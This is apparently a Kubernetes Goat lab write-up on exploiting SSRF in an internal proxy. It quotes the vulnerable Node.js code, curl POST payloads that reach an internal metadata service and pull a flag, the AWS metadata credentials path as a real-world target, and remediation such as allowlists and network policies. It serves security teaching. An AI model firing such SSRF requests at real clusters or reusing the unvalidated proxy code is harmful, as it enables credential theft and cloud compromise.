# Kubernetes Security Lab: SSRF in the Kubernetes World
**Author:** xSnaeRx  
**Date:** May 27, 2026  
**Lab Environment:** Kubernetes Goat on kind (Kubernetes in Docker) via WSL2  
**Scenario:** SSRF in the Kubernetes World  

---

## Executive Summary

During this lab exercise, a Server Side Request Forgery (SSRF) vulnerability was identified in an internal proxy application running within the Kubernetes cluster. The proxy accepted user-supplied URLs without validation and made HTTP requests on behalf of the requester. By exploiting this vulnerability, internal services that were not directly accessible from outside the cluster were reached, ultimately exposing sensitive secrets including a Kubernetes Goat flag.

---

## Environment

| Component | Details |
|---|---|
| Cluster | kind (Kubernetes in Docker) |
| Namespace | `default` |
| Vulnerable Pod | `internal-proxy-deployment-59f75f7dfc-m2448` |
| Vulnerable Service | `internal-proxy-api-service` (port 3000) |
| Internal Target | `metadata-db` (ClusterIP, port 80) |
| API Server | `https://10.96.0.1:443` |

---

## Findings

### Finding 1 — SSRF Vulnerability in Internal Proxy Application

**Severity:** High

**Description:**  
The internal proxy application accepted a user-supplied `endpoint` parameter via HTTP POST request and used it to make outbound HTTP requests using `curl` with no URL validation or whitelist enforcement. This allowed an attacker to direct the proxy to make requests to any internal cluster service, bypassing network restrictions that would otherwise prevent direct external access.

**Vulnerable Code (server.js):**
```javascript
app.post('/', function (req, res) {
    var endpoint = req.body.endpoint, method = req.body.method || 'GET', headers = req.body.headers || {};
    const child = spawnSync('curl', [endpoint, '-H', headers, '-X', method]);
    if (child.stdout) {
        res.send(child.stdout)
    }
});
```

The application takes the `endpoint` value directly from user input and passes it to `curl` with no sanitization or validation whatsoever.

**How It Was Discovered:**  
The proxy application was identified by reviewing running services in the cluster. After port forwarding the service locally, the application source code was inspected via `kubectl exec` to understand how it processed requests.

The vulnerable endpoint was confirmed by making a POST request directly:

```bash
curl -X POST http://127.0.0.1:3000 \
  -H "Content-Type: application/json" \
  -d '{"endpoint": "http://metadata-db", "method": "GET"}'
```

**Result:**
```html
<pre>
<a href="1.0">1.0</a>
<a href="latest/">latest/</a>
</pre>
```

The proxy successfully fetched the internal `metadata-db` service, confirming the SSRF vulnerability.

---

### Finding 2 — Internal Metadata Service Exposed via SSRF

**Severity:** Critical

**Description:**  
The internal `metadata-db` service simulates a cloud metadata service (similar to the AWS Instance Metadata Service at `169.254.169.254`). By exploiting the SSRF vulnerability, the full directory structure of the metadata service was enumerated and sensitive secrets were extracted.

**Enumeration of Metadata Paths:**  
By inspecting the `metadata-db` pod directly, the following file structure was discovered:

```
/metadata/latest/profile
/metadata/latest/events/list/1
/metadata/latest/events/list/2
/metadata/latest/events/list/3
/metadata/latest/hostname
/metadata/latest/secrets/kubernetes-goat
/metadata/latest/secrets/info
```

**Secrets Extracted:**

The secrets endpoint was queried via SSRF:

```bash
curl -X POST http://127.0.0.1:3000 \
  -H "Content-Type: application/json" \
  -d '{"endpoint": "http://metadata-db/latest/secrets/kubernetes-goat", "method": "GET"}'
```

**Response:**
```json
{"metadata": "static-metadata", "data": "azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI="}
```

**Decoded Flag:**
```bash
echo "azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI=" | base64 -d
# k8s-goat-ca90ef85db7a5aef0198d02fb0df9cab
```

---

## Attack Chain

```
Identified internal proxy service
      ↓
Port forwarded service locally
      ↓
Inspected application source code via kubectl exec
      ↓
Confirmed SSRF via POST request to proxy
      ↓
Discovered metadata-db internal service
      ↓
Enumerated metadata service file structure
      ↓
Extracted base64 encoded secrets
      ↓
Decoded flag: k8s-goat-ca90ef85db7a5aef0198d02fb0df9cab
```

---

## Root Cause

The proxy application was designed to forward HTTP requests on behalf of users but implemented no restrictions on which URLs could be requested. In a real cloud environment, this would allow an attacker to query the AWS Instance Metadata Service at `169.254.169.254`, retrieving IAM credentials and potentially leading to full cloud account compromise — exactly as demonstrated in the Wiz EKS Cluster Games challenges 3 and 4.

---

## Real World Impact

In a production AWS/EKS environment, this SSRF vulnerability could be used to:

1. Query `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to steal IAM role credentials
2. Use those credentials to access S3 buckets, RDS databases, or other AWS resources
3. Pivot to other internal services not exposed to the internet
4. Exfiltrate sensitive configuration data from internal APIs

---

## Remediation

### 1. Implement URL Allowlisting
Only permit requests to explicitly approved domains or IP ranges:

```javascript
const ALLOWED_HOSTS = ['api.github.com', 'internal-approved-service'];

app.post('/', function (req, res) {
    const url = new URL(req.body.endpoint);
    if (!ALLOWED_HOSTS.includes(url.hostname)) {
        return res.status(403).send('Forbidden');
    }
    // proceed with request
});
```

### 2. Block Access to Cloud Metadata Endpoints
Explicitly block requests to the AWS metadata service IP:

```javascript
const BLOCKED_IPS = ['169.254.169.254'];
```

### 3. Enforce IMDSv2 on EKS Nodes
Require token-based metadata requests and set hop limit to 1 to prevent pods from accessing IMDS:

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id <instance-id> \
  --http-tokens required \
  --http-put-response-hop-limit 1
```

### 4. Apply Network Policies
Restrict which pods can communicate with internal services using Kubernetes NetworkPolicies:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata-access
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32
```

---

## Key Takeaway

> SSRF vulnerabilities in Kubernetes environments are particularly dangerous because pods have network access to internal cluster services and cloud metadata endpoints that are invisible to external attackers. A single unvalidated URL parameter can be the difference between a secure cluster and full cloud account compromise.

---

## References

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat)
- [AWS IMDSv2 Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [MITRE ATT&CK - Server Side Request Forgery](https://attack.mitre.org/techniques/T1090/)
